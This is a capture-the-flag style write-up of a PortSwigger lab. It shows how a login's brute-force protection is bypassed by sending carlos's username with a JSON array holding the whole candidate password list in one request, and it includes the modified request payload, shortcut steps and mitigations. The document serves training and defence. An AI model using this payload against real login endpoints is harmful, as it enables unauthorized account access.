# Broken brute-force protection, multiple credentials per request

**Source:** [PortSwigger](https://portswigger.net/web-security/authentication/password-based/lab-broken-brute-force-protection-multiple-credentials-per-request)  
**Category:** Authentication vulnerabilities  
**Difficulty:** EXPERT

## Objective
To solve the lab, brute-force Carlos's password, then access his account page.

## Vulnerability
This lab is vulnerable due to a logic flaw in its brute-force protection. To solve the lab, brute-force Carlos's password, then access his account page.

Victim's username: `carlos`  
[Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

## Exploitation

### Steps

1. Attempted to log in using `carlos:test`, intercepted the HTTP request, and sent it to Repeater.

2. The request body contained the following JSON:

```json
{"username":"carlos","password":"test"}
```

Attempted to log in using the first 5 passwords from the candidate passwords list. After the third attempt, the login was blocked.

3. Attempted to bypass the protection by adding the `X-Forwarded-For: 1.1.1.1` header and changing the IP address, but this was unsuccessful.

4. Attempted to remove and change the session, but this was also unsuccessful.

5. Attempted to append multiple passwords to the JSON request in the following format:

```json
{
    "username": "carlos",
    "password": [
        "123456",
        "password",
        "qwerty",
        ...
    ]
}
```

using the entire candidate passwords list.

6. The login was successful. Replayed the Repeater request in the browser and accessed Carlos's account.

### Payload

Original request:

```json
{
    "username": "carlos",
    "password": "test"
}
```

Modified request:

```json
{
    "username": "carlos",
    "password": [
        "123456",
        "password",
        "12345678",
        "qwerty",
        "123456789",
        "... remaining candidate passwords ..."
    ]
}
```

### Shortcut

1. Intercept the login request and send it to Repeater.
2. Replace the single password value with an array containing the entire candidate passwords list.
3. Send the request and replay it in the browser to access Carlos's account.

## Impact

An attacker can bypass brute-force protection by submitting multiple credentials within a single request. This allows many password guesses while only triggering the application's protection once, potentially leading to unauthorized account access.

## Mitigation

Validate that each authentication request contains only a single username and password pair.

Additional protections:
- Reject requests containing unexpected JSON structures or arrays.
- Count every password attempt individually, even if multiple credentials are supplied in one request.
- Implement rate limiting and account lockout mechanisms.
- Monitor and block abnormal authentication requests.

## Tools

- Burp Suite
- Repeater

## Notes

This lab demonstrates a logic flaw in brute-force protection where the application counts a single HTTP request as one login attempt, even when multiple passwords are supplied in a JSON array. As a result, an attacker can test an entire password list in a single request and bypass the intended rate-limiting mechanism.